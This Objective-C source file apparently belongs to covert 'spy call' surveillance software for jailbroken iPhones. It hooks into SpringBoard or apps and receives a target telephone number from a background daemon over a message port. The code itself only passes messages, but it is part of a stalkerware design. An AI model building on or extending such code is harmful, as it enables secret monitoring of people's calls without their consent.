//
//  TelephoneNumberPicker.m
//  MSSPC
//
//  Created by Makara Khloth on 3/23/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "TelephoneNumberPicker.h"
#import "SpyCallUtils.h"
#import "DefStd.h"

@interface TelephoneNumberPicker (private)

- (void) main;

@end

@implementation TelephoneNumberPicker

@synthesize mTelephoneNumber;

- (id) init {
	if ((self = [super init])) {
		[NSThread detachNewThreadSelector:@selector(main) toTarget:self withObject:nil];
	}
	return (self);
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSString *telephoneNumber = [[NSString alloc] initWithData:aRawData encoding:NSUTF8StringEncoding];
	[self setMTelephoneNumber:telephoneNumber];
	[telephoneNumber release];
	APPLOGVERBOSE(@"Telephone number from Daemon = %@", [self mTelephoneNumber]);
}

- (void) main {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		MessagePortIPCReader *reader = nil;
		if ([SpyCallUtils isSpringBoardHook]) {
			reader = [[MessagePortIPCReader alloc] initWithPortName:kSpyCallPhoneNumberPickerMsgPort1
										 withMessagePortIPCDelegate:self];
		} else if ([SpyCallUtils isMobileApplicationHook]) {
            if ([[[UIDevice currentDevice] systemVersion] integerValue] < 9) { // Below iOS 9, there is no issue about Sandbox
                reader = [[MessagePortIPCReader alloc] initWithPortName:kSpyCallPhoneNumberPickerMsgPort2
                                             withMessagePortIPCDelegate:self];
            } else {
                // Don't rely on number from Daemon
            }
		}
		[reader start];
		CFRunLoopRun();
		[reader release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

- (void) dealloc {
	[super dealloc];
}

@end
